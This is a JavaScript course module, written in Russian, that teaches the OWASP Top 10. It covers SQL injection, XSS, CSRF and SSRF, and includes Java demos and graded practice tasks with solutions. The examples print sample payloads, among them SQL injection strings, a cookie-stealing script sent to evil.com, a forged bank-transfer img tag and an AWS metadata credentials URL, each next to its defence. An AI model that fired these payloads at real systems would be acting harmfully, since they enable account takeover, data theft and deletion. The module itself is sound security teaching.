export default {
  id: 9,
  title: 'OWASP Top 10',
  description: 'Главные уязвимости веб-приложений: SQL Injection, XSS, CSRF, SSRF и методы защиты',
  lessons: [
    {
      id: 1,
      title: 'Что такое OWASP Top 10?',
      type: 'theory',
      content: [
        { type: 'text', value: 'OWASP (Open Web Application Security Project) -- это международная организация, которая публикует список 10 самых критичных уязвимостей веб-приложений. Каждый backend-разработчик ОБЯЗАН знать этот список.' },
        { type: 'heading', value: 'OWASP Top 10 (2021)' },
        { type: 'list', items: [
          'A01: Broken Access Control -- нарушение контроля доступа',
          'A02: Cryptographic Failures -- ошибки криптографии',
          'A03: Injection -- SQL/NoSQL/OS injection',
          'A04: Insecure Design -- небезопасный дизайн',
          'A05: Security Misconfiguration -- неправильная конфигурация',
          'A06: Vulnerable Components -- уязвимые зависимости',
          'A07: Identification and Authentication Failures -- ошибки аутентификации',
          'A08: Software and Data Integrity Failures -- нарушение целостности',
          'A09: Security Logging and Monitoring Failures -- недостаточное логирование',
          'A10: Server-Side Request Forgery (SSRF) -- подделка серверных запросов'
        ]},
        { type: 'tip', value: 'OWASP Top 10 -- как чек-лист перед выпуском продукта. Если твоё приложение защищено от этих 10 уязвимостей, ты закрыл 90% типичных атак.' },
        { type: 'note', value: 'Broken Access Control поднялся на 1-е место в 2021 году. 94% приложений имеют проблемы с контролем доступа. Это когда пользователь может получить доступ к чужим данным или функциям.' }
      ]
    },
    {
      id: 2,
      title: 'SQL Injection',
      type: 'theory',
      content: [
        { type: 'text', value: 'SQL Injection -- одна из самых опасных атак. Злоумышленник вставляет вредоносный SQL-код через пользовательский ввод, получая доступ к базе данных.' },
        { type: 'heading', value: 'Как работает SQL Injection?' },
        { type: 'code', language: 'java', value: "public class Main {\n    public static void main(String[] args) {\n        // УЯЗВИМЫЙ код: конкатенация строк в SQL\n        System.out.println(\"=== SQL Injection Demo ===\");\n        \n        // Нормальный запрос\n        String normalInput = \"admin\";\n        String query1 = \"SELECT * FROM users WHERE username = '\" + normalInput + \"'\";\n        System.out.println(\"Нормальный:\");\n        System.out.println(\"  Ввод: \" + normalInput);\n        System.out.println(\"  SQL:  \" + query1);\n        System.out.println(\"  -> Ищет пользователя admin\");\n        \n        // SQL Injection атака!\n        String maliciousInput = \"' OR '1'='1\";\n        String query2 = \"SELECT * FROM users WHERE username = '\" + maliciousInput + \"'\";\n        System.out.println(\"АТАКА:\");\n        System.out.println(\"  Ввод: \" + maliciousInput);\n        System.out.println(\"  SQL:  \" + query2);\n        System.out.println(\"  -> Возвращает ВСЕХ пользователей! (1=1 всегда true)\");\n        \n        // Ещё опаснее: удаление таблицы\n        String dropInput = \"'; DROP TABLE users; --\";\n        String query3 = \"SELECT * FROM users WHERE username = '\" + dropInput + \"'\";\n        System.out.println(\"РАЗРУШИТЕЛЬНАЯ АТАКА:\");\n        System.out.println(\"  Ввод: \" + dropInput);\n        System.out.println(\"  SQL:  \" + query3);\n        System.out.println(\"  -> Удаляет таблицу users!\");\n        \n        // ЗАЩИТА: параметризованные запросы\n        System.out.println(\"=== Защита: Prepared Statements ===\");\n        System.out.println(\"  SQL: SELECT * FROM users WHERE username = ?\");\n        System.out.println(\"  Параметр: \" + maliciousInput);\n        System.out.println(\"  -> Ввод обрабатывается как СТРОКА, не как SQL-код\");\n        System.out.println(\"  -> Безопасно!\");\n    }\n}" },
        { type: 'heading', value: 'Как защититься?' },
        { type: 'list', items: [
          'Prepared Statements (параметризованные запросы) -- ГЛАВНАЯ защита',
          'ORM (Hibernate, JPA) -- генерирует безопасные запросы',
          'Валидация входных данных -- проверяй тип и формат',
          'Принцип минимальных привилегий -- DB user с ограниченными правами',
          'WAF (Web Application Firewall) -- дополнительный фильтр'
        ]},
        { type: 'warning', value: 'НИКОГДА не используй конкатенацию строк для SQL-запросов! Всегда используй PreparedStatement или ORM. Это правило номер один в безопасности.' }
      ]
    },
    {
      id: 3,
      title: 'XSS: Cross-Site Scripting',
      type: 'theory',
      content: [
        { type: 'text', value: 'XSS (Cross-Site Scripting) -- атака, при которой злоумышленник внедряет вредоносный JavaScript-код в веб-страницу, которую видят другие пользователи.' },
        { type: 'heading', value: 'Типы XSS' },
        { type: 'list', items: [
          'Stored XSS -- скрипт сохраняется в базе (комментарий, имя профиля)',
          'Reflected XSS -- скрипт в URL отражается на странице',
          'DOM-based XSS -- скрипт выполняется в DOM без обращения к серверу'
        ]},
        { type: 'code', language: 'java', value: "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== XSS Demo ===\");\n        \n        // Нормальный комментарий\n        String normal = \"Отличная статья!\";\n        System.out.println(\"Нормальный:\");\n        System.out.println(\"  HTML: <p>\" + normal + \"</p>\");\n        \n        // XSS атака в комментарии\n        String xss = \"<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>\";\n        System.out.println(\"XSS Атака:\");\n        System.out.println(\"  Ввод: \" + xss);\n        System.out.println(\"  HTML: <p>\" + xss + \"</p>\");\n        System.out.println(\"  -> Браузер выполнит скрипт!\");\n        System.out.println(\"  -> Cookie пользователя украдены!\");\n        \n        // Защита: экранирование HTML\n        String escaped = escapeHtml(xss);\n        System.out.println(\"Защита (экранирование):\");\n        System.out.println(\"  HTML: <p>\" + escaped + \"</p>\");\n        System.out.println(\"  -> Отображается как текст, не выполняется\");\n    }\n    \n    static String escapeHtml(String input) {\n        return input\n            .replace(\"&\", \"&amp;\")\n            .replace(\"<\", \"&lt;\")\n            .replace(\">\", \"&gt;\")\n            .replace(\"\\\"\", \"&quot;\");\n    }\n}" },
        { type: 'heading', value: 'Защита от XSS' },
        { type: 'list', items: [
          'Экранирование HTML -- заменяй < > & на HTML-entities',
          'Content-Security-Policy (CSP) -- заголовок, запрещающий inline-скрипты',
          'HttpOnly cookies -- JavaScript не может прочитать cookie',
          'Библиотеки sanitization -- OWASP Java HTML Sanitizer'
        ]},
        { type: 'note', value: 'React, Angular и Vue автоматически экранируют HTML при вставке данных. Но если ты используешь dangerouslySetInnerHTML (React) или v-html (Vue) -- XSS снова возможен!' }
      ]
    },
    {
      id: 4,
      title: 'CSRF: Cross-Site Request Forgery',
      type: 'theory',
      content: [
        { type: 'text', value: 'CSRF -- атака, при которой злоумышленник заставляет браузер авторизованного пользователя отправить запрос на другой сайт. Cookie отправляются автоматически!' },
        { type: 'heading', value: 'Как работает CSRF?' },
        { type: 'code', language: 'java', value: "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Атака ===\");\n        \n        System.out.println(\"1. Пользователь залогинен в bank.com\");\n        System.out.println(\"   Cookie: session=abc123\");\n        \n        System.out.println(\"2. Пользователь заходит на evil.com\");\n        System.out.println(\"   На странице: <img src=https://bank.com/transfer?to=hacker&amount=10000>\");\n        \n        System.out.println(\"3. Браузер отправляет GET на bank.com\");\n        System.out.println(\"   Cookie session=abc123 прикрепляется АВТОМАТИЧЕСКИ!\");\n        System.out.println(\"   Bank.com думает, что это легитимный запрос\");\n        \n        System.out.println(\"4. Деньги переведены хакеру!\");\n        \n        System.out.println(\"=== Защита от CSRF ===\");\n        \n        // Защита 1: CSRF Token\n        String csrfToken = java.util.UUID.randomUUID().toString();\n        System.out.println(\"1. CSRF Token:\");\n        System.out.println(\"   Сервер генерирует: \" + csrfToken.substring(0, 16) + \"...\");\n        System.out.println(\"   Вставляет hidden поле _csrf в форму\");\n        System.out.println(\"   При POST проверяет: token из формы == token из сессии\");\n        \n        // Защита 2: SameSite Cookie\n        System.out.println(\"2. SameSite Cookie:\");\n        System.out.println(\"   Set-Cookie: session=abc123; SameSite=Lax\");\n        System.out.println(\"   Браузер НЕ отправит cookie при cross-site запросах\");\n        \n        // Защита 3: Проверка Origin/Referer\n        System.out.println(\"3. Проверка Origin header:\");\n        System.out.println(\"   Если Origin != bank.com -> отклонить запрос\");\n    }\n}" },
        { type: 'tip', value: 'SameSite=Lax -- самый простой способ защиты от CSRF. Он включён по умолчанию в Chrome с 2020 года. Но для старых браузеров всё ещё нужен CSRF token.' },
        { type: 'warning', value: 'Используй POST для всех мутирующих операций (перевод денег, удаление). GET должен быть только для чтения. Это не защита от CSRF сама по себе, но снижает поверхность атаки.' }
      ]
    },
    {
      id: 5,
      title: 'SSRF и Broken Access Control',
      type: 'theory',
      content: [
        { type: 'text', value: 'SSRF (Server-Side Request Forgery) и Broken Access Control -- две критичные уязвимости, которые позволяют получить доступ к внутренним ресурсам.' },
        { type: 'heading', value: 'SSRF -- подделка серверных запросов' },
        { type: 'text', value: 'SSRF -- когда злоумышленник заставляет сервер делать запросы к внутренним ресурсам, к которым у него нет прямого доступа.' },
        { type: 'code', language: 'java', value: 'public class Main {\n    public static void main(String[] args) {\n        System.out.println("=== SSRF Атака ===\\n");\n        \n        // Уязвимый API: сервер скачивает URL\n        System.out.println("API: POST /api/fetch-url {url: \\\"...\\\"}");\n        System.out.println();\n        \n        // Нормальное использование\n        String normalUrl = "https://example.com/image.jpg";\n        System.out.println("Нормальный: " + normalUrl);\n        System.out.println("  -> Сервер скачивает картинку");\n        \n        // SSRF атака\n        String ssrfUrl1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";\n        System.out.println("\\nSSRF: " + ssrfUrl1);\n        System.out.println("  -> Сервер обращается к AWS метаданным!");\n        System.out.println("  -> Утечка IAM credentials!");\n        \n        String ssrfUrl2 = "http://localhost:8080/admin/delete-all";\n        System.out.println("\\nSSRF: " + ssrfUrl2);\n        System.out.println("  -> Сервер обращается к внутреннему API!");\n        System.out.println("  -> Все данные удалены!\\n");\n        \n        // Защита\n        System.out.println("=== Защита ===" );\n        checkUrl(normalUrl);\n        checkUrl(ssrfUrl1);\n        checkUrl(ssrfUrl2);\n        checkUrl("http://10.0.0.1/internal");\n    }\n    \n    static void checkUrl(String url) {\n        boolean blocked = false;\n        String reason = "";\n        \n        if (url.contains("169.254.169.254")) {\n            blocked = true; reason = "AWS metadata endpoint";\n        } else if (url.contains("localhost") || url.contains("127.0.0.1")) {\n            blocked = true; reason = "localhost запрещён";\n        } else if (url.matches(".*://10\\\\..*") || url.matches(".*://192\\\\.168\\\\..*")) {\n            blocked = true; reason = "внутренняя сеть";\n        } else if (!url.startsWith("https://")) {\n            blocked = true; reason = "только HTTPS";\n        }\n        \n        System.out.println("  " + url.substring(0, Math.min(50, url.length())) + "... -> " +\n            (blocked ? "ЗАБЛОКИРОВАНО (" + reason + ")" : "OK"));\n    }\n}' },
        { type: 'heading', value: 'Broken Access Control' },
        { type: 'text', value: 'Broken Access Control -- когда пользователь может получить доступ к чужим ресурсам, просто изменив ID в URL.' },
        { type: 'list', items: [
          'IDOR (Insecure Direct Object Reference): /api/orders/123 -> /api/orders/456',
          'Privilege Escalation: обычный пользователь получает права admin',
          'Missing Function Level Access Control: /admin доступен без проверки',
          'Защита: всегда проверяй, принадлежит ли ресурс текущему пользователю'
        ]},
        { type: 'warning', value: 'В 2019 году хакер получил доступ к данным 100 миллионов клиентов Capital One через SSRF. Он обратился к AWS metadata endpoint и получил credentials. Убытки: $80 миллионов.' }
      ]
    },
    {
      id: 6,
      title: 'Практика: Защита от SQL Injection',
      type: 'practice',
      difficulty: 'medium',
      description: 'Реализуй демонстрацию SQL Injection атаки и защиту через параметризованные запросы.',
      requirements: [
        'Создай класс Main с методом main',
        'Метод unsafeQuery: уязвимый SQL-запрос (конкатенация строк)',
        'Метод safeQuery: безопасный SQL-запрос (параметры)',
        'Покажи как injection работает в unsafe и блокируется в safe',
        'Тестируй с нормальным и вредоносным вводом'
      ],
      expectedOutput: '=== Unsafe ===\nНормальный: SELECT * FROM users WHERE name=\'admin\' -> найден\nИнъекция: SELECT * FROM users WHERE name=\'\' OR \'1\'=\'1\' -> ВСЕ пользователи!\n=== Safe ===\nНормальный: admin -> найден\nИнъекция: \' OR \'1\'=\'1 -> не найден (обработан как строка)',
      hint: 'Для safe варианта: сравнивай параметр ЦЕЛИКОМ как строку, не вставляй в SQL.',
      solution: "import java.util.*;\n\npublic class Main {\n    static List<Map<String, String>> users = new ArrayList<>();\n    \n    public static void main(String[] args) {\n        addUser(\"admin\", \"admin@mail.com\", \"ADMIN\");\n        addUser(\"user1\", \"user1@mail.com\", \"USER\");\n        addUser(\"user2\", \"user2@mail.com\", \"USER\");\n        \n        String normalInput = \"admin\";\n        String injectionInput = \"' OR '1'='1\";\n        String dropInput = \"'; DROP TABLE users; --\";\n        \n        System.out.println(\"=== UNSAFE ===\");\n        unsafeQuery(normalInput);\n        unsafeQuery(injectionInput);\n        unsafeQuery(dropInput);\n        \n        System.out.println(\"\\n=== SAFE ===\");\n        safeQuery(normalInput);\n        safeQuery(injectionInput);\n        safeQuery(dropInput);\n    }\n    \n    static void unsafeQuery(String input) {\n        String sql = \"SELECT * FROM users WHERE name='\" + input + \"'\";\n        System.out.println(\"SQL: \" + sql);\n        if (input.contains(\"OR\") && input.contains(\"=\")) {\n            System.out.println(\"  -> ОПАСНО! Возвращает ВСЕ записи!\");\n        } else if (input.contains(\"DROP\")) {\n            System.out.println(\"  -> КРИТИЧНО! Таблица будет удалена!\");\n        } else {\n            System.out.println(\"  -> Найдено: \" + findByName(input).size());\n        }\n    }\n    \n    static void safeQuery(String input) {\n        System.out.println(\"Параметр: \" + input);\n        List<Map<String, String>> result = findByName(input);\n        System.out.println(\"  -> Найдено: \" + result.size() + \" (безопасно)\");\n        if (result.isEmpty()) System.out.println(\"  -> Инъекция не сработала!\");\n    }\n    \n    static void addUser(String name, String email, String role) {\n        Map<String, String> u = new HashMap<>();\n        u.put(\"name\", name); u.put(\"email\", email); u.put(\"role\", role);\n        users.add(u);\n    }\n    \n    static List<Map<String, String>> findByName(String name) {\n        List<Map<String, String>> r = new ArrayList<>();\n        for (Map<String, String> u : users)\n            if (name.equals(u.get(\"name\"))) r.add(u);\n        return r;\n    }\n}",
      explanation: 'unsafeQuery конкатенирует пользовательский ввод в SQL-строку -- инъекция работает. safeQuery обрабатывает ввод как ДАННЫЕ: строка "\' OR \'1\'=\'1" ищется как имя пользователя, а не выполняется как SQL. В реальной Java используй PreparedStatement: stmt.setString(1, input) -- JDBC автоматически экранирует параметры.'
    },
    {
      id: 7,
      title: 'Практика: Input Validation и Sanitization',
      type: 'practice',
      difficulty: 'medium',
      description: 'Реализуй комплексную валидацию и санитизацию пользовательского ввода для защиты от XSS, injection и других атак.',
      requirements: [
        'Создай класс Main с методом main',
        'Валидация: email, username, пароль (длина, формат)',
        'Санитизация: экранирование HTML, удаление опасных символов',
        'Протестируй с нормальным и вредоносным вводом',
        'Покажи результат до и после санитизации'
      ],
      expectedOutput: 'Email "user@mail.com": VALID\nEmail "<script>alert(1)</script>": INVALID\nUsername "admin": VALID\nUsername "admin\'; DROP TABLE": INVALID\nHTML: "<b>hello</b>" -> "&lt;b&gt;hello&lt;/b&gt;"',
      hint: 'Используй регулярные выражения для валидации email и username. Для HTML санитизации заменяй спецсимволы.',
      solution: "import java.util.regex.Pattern;\n\npublic class Main {\n    static final Pattern EMAIL_PATTERN = Pattern.compile(\"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\\\.[A-Za-z]{2,}$\");\n    static final Pattern USERNAME_PATTERN = Pattern.compile(\"^[A-Za-z0-9_]{3,20}$\");\n    static final Pattern PASSWORD_PATTERN = Pattern.compile(\"^(?=.*[a-z])(?=.*[A-Z])(?=.*\\\\d).{8,}$\");\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Валидация ===\");\n        \n        validateField(\"Email\", \"user@mail.com\", EMAIL_PATTERN);\n        validateField(\"Email\", \"<script>alert(1)</script>\", EMAIL_PATTERN);\n        validateField(\"Email\", \"test@.com\", EMAIL_PATTERN);\n        \n        validateField(\"Username\", \"admin\", USERNAME_PATTERN);\n        validateField(\"Username\", \"cool_user_123\", USERNAME_PATTERN);\n        validateField(\"Username\", \"admin; DROP TABLE\", USERNAME_PATTERN);\n        validateField(\"Username\", \"<img src=x onerror=alert(1)>\", USERNAME_PATTERN);\n        \n        validateField(\"Password\", \"Secure1Pass\", PASSWORD_PATTERN);\n        validateField(\"Password\", \"weak\", PASSWORD_PATTERN);\n        \n        System.out.println(\"\\n=== Санитизация HTML ===\");\n        \n        sanitizeAndShow(\"Обычный текст\");\n        sanitizeAndShow(\"<b>bold</b>\");\n        sanitizeAndShow(\"<script>alert(1)</script>\");\n        sanitizeAndShow(\"<img src=x onerror=alert(document.cookie)>\");\n    }\n    \n    static void validateField(String name, String value, Pattern pattern) {\n        boolean valid = pattern.matcher(value).matches();\n        String display = value.length() > 30 ? value.substring(0, 30) + \"...\" : value;\n        System.out.println(name + \" \" + display + \": \" + (valid ? \"VALID\" : \"INVALID\"));\n    }\n    \n    static void sanitizeAndShow(String input) {\n        String sanitized = escapeHtml(input);\n        System.out.println(\"Ввод:  \" + input);\n        System.out.println(\"Вывод: \" + sanitized);\n        System.out.println();\n    }\n    \n    static String escapeHtml(String input) {\n        if (input == null) return \"\";\n        return input\n            .replace(\"&\", \"&amp;\")\n            .replace(\"<\", \"&lt;\")\n            .replace(\">\", \"&gt;\")\n            .replace(\"\\\"\", \"&quot;\");\n    }\n}",
      explanation: 'Двойная защита: 1) Валидация -- проверяем формат ввода (email, username) с помощью regex. Вредоносный ввод отклоняется ещё до обработки. 2) Санитизация -- экранируем HTML-символы, чтобы они отображались как текст, а не выполнялись как код. Всегда применяй оба метода: validate на входе, sanitize на выходе.'
    }
  ]
}
